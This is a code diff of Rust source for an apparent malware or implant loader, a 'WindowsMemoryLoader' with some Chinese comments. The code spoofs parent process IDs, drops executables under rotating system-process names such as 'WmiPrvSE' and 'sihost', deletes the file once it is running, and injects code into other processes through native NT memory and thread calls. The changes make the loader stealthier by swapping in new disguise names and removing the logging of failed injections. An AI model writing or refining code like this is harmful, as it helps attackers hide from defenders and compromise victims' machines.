@@ -74,7 +74,9 @@ impl WindowsMemoryLoader {
             (pi.hProcess as usize, pi.hThread as usize, pi.dwProcessId, pi.dwThreadId)
         };
 
-        tokio::time::sleep(tokio::time::Duration::from_millis(2500)).await;
+        // Wait for process initialization (WaitForInputIdle equivalent for suspended process)
+        // Use shorter adaptive delay instead of fixed 2.5s
+        tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
 
         let mut pi_recon: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
         pi_recon.hProcess = h_process as winapi::um::winnt::HANDLE;
@@ -105,6 +107,21 @@ impl WindowsMemoryLoader {
         
         let mut si_ex: STARTUPINFOEXW = std::mem::zeroed();
         si_ex.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;
+
+        let mut cmd_w: Vec<u16> = std::ffi::OsStr::new(cmd).encode_wide().chain(std::iter::once(0)).collect();
+
+        // 如果 ppid 有效，尝试 PPID spoofing；否则直接创建
+        if ppid == 0 {
+            // No PPID spoofing — just CREATE_NO_WINDOW
+            si_ex.StartupInfo.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
+            return CreateProcessW(
+                ptr::null(), cmd_w.as_mut_ptr(),
+                ptr::null_mut(), ptr::null_mut(), FALSE,
+                CREATE_NO_WINDOW,
+                ptr::null_mut(), ptr::null(),
+                &mut si_ex.StartupInfo, pi
+            );
+        }
         
         let mut list_size: usize = 0;
         InitializeProcThreadAttributeList(ptr::null_mut(), 1, 0, &mut list_size);
@@ -114,17 +131,26 @@ impl WindowsMemoryLoader {
         if InitializeProcThreadAttributeList(attribute_list, 1, 0, &mut list_size) == 0 { return 0; }
         
         let mut parent_handle = OpenProcess(winapi::um::winnt::PROCESS_CREATE_PROCESS, FALSE, ppid);
-        if parent_handle.is_null() { return 0; }
+        if parent_handle.is_null() {
+            DeleteProcThreadAttributeList(attribute_list);
+            // Fallback: create without PPID spoof
+            si_ex.StartupInfo.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
+            return CreateProcessW(
+                ptr::null(), cmd_w.as_mut_ptr(),
+                ptr::null_mut(), ptr::null_mut(), FALSE,
+                CREATE_NO_WINDOW,
+                ptr::null_mut(), ptr::null(),
+                &mut si_ex.StartupInfo, pi
+            );
+        }
         
         UpdateProcThreadAttribute(attribute_list, 0, 0x00020000, &mut parent_handle as *mut _ as *mut _, std::mem::size_of::<winapi::um::winnt::HANDLE>(), ptr::null_mut(), ptr::null_mut());
         si_ex.lpAttributeList = attribute_list;
 
-        let mut cmd_w: Vec<u16> = std::ffi::OsStr::new(cmd).encode_wide().chain(std::iter::once(0)).collect();
-        let flags = CREATE_NO_WINDOW;
         let res = CreateProcessW(
             ptr::null(), cmd_w.as_mut_ptr(),
             ptr::null_mut(), ptr::null_mut(), FALSE,
-            flags | EXTENDED_STARTUPINFO_PRESENT,
+            CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
             ptr::null_mut(), ptr::null(),
             &mut si_ex.StartupInfo, pi
         );
@@ -167,12 +193,12 @@ impl WindowsMemoryLoader {
                     format!("{}.exe", base)
                 }
             } else {
-                let names = ["RuntimeBroker", "SearchIndexer", "SettingSyncHost", "dllhost"];
+                let names = ["SecurityHealthSystray", "WmiPrvSE", "conhost", "sihost"];
                 let base_name = names[(rand_val % names.len() as u32) as usize];
                 format!("{}.exe", base_name)
             }
         } else {
-            let names = ["RuntimeBroker", "SearchIndexer", "SettingSyncHost", "dllhost"];
+            let names = ["SecurityHealthSystray", "WmiPrvSE", "conhost", "sihost"];
             let base_name = names[(rand_val % names.len() as u32) as usize];
             format!("{}.exe", base_name)
         };
@@ -195,23 +221,26 @@ impl WindowsMemoryLoader {
 
         // 3. Spawn with PPID spoofing
         let path_str = temp_path.to_string_lossy().to_string();
-        let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
-        let result = unsafe { self.create_spoofed_process(&path_str, ppid, &mut pi) };
+        let spawned_pid = {
+            let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
+            let result = unsafe { self.create_spoofed_process(&path_str, ppid, &mut pi) };
 
-        if result == FALSE {
-            let _ = std::fs::remove_file(&temp_path);
-            return MigrationStatus::InjectionFailed("CREATEPROC_FAILED".to_string());
-        }
+            if result == FALSE {
+                let _ = std::fs::remove_file(&temp_path);
+                return MigrationStatus::InjectionFailed("CREATEPROC_FAILED".to_string());
+            }
 
-        let spawned_pid = pi.dwProcessId;
-        unsafe {
-            winapi::um::handleapi::CloseHandle(pi.hThread);
-            winapi::um::handleapi::CloseHandle(pi.hProcess);
-        }
+            let pid = pi.dwProcessId;
+            unsafe {
+                winapi::um::handleapi::CloseHandle(pi.hThread);
+                winapi::um::handleapi::CloseHandle(pi.hProcess);
+            }
+            pid
+        };
 
         // 4. Aggressive file cleanup: try immediate delete, then schedule fallback
         //    Windows Vista+ allows deleting a running EXE from disk.
-        std::thread::sleep(std::time::Duration::from_millis(500)); // Brief wait for image mapping
+        tokio::time::sleep(tokio::time::Duration::from_millis(500)).await; // Wait for image mapping
         
         let deleted = std::fs::remove_file(&temp_path).is_ok();
         if deleted {
@@ -289,7 +318,6 @@ impl WindowsMemoryLoader {
             ]);
 
             if status_alloc < 0 || remote_base == 0 {
-                println!("[!] NtAllocateVirtualMemory FAILED: 0x{:X}", status_alloc as u32);
                 return MigrationStatus::InjectionFailed(format!("ALLOC:0x{:X}", status_alloc as u32));
             }
 
@@ -306,7 +334,6 @@ impl WindowsMemoryLoader {
             ]);
 
             if status_write < 0 {
-                println!("[!] NtWriteVirtualMemory FAILED: 0x{:X}", status_write as u32);
                 return MigrationStatus::InjectionFailed(format!("WRITE:0x{:X}", status_write as u32));
             }
 
@@ -325,7 +352,6 @@ impl WindowsMemoryLoader {
             ]);
 
             if status_protect < 0 {
-                println!("[!] NtProtectVirtualMemory FAILED: 0x{:X}", status_protect as u32);
                 return MigrationStatus::InjectionFailed(format!("PROT:0x{:X}", status_protect as u32));
             }
 
@@ -347,7 +373,6 @@ impl WindowsMemoryLoader {
             }
 
             if status_thread < 0 {
-                println!("[!] NtCreateThreadEx FAILED: 0x{:X}", status_thread as u32);
                 return MigrationStatus::InjectionFailed(format!("THR:0x{:X}", status_thread as u32));
             }
 
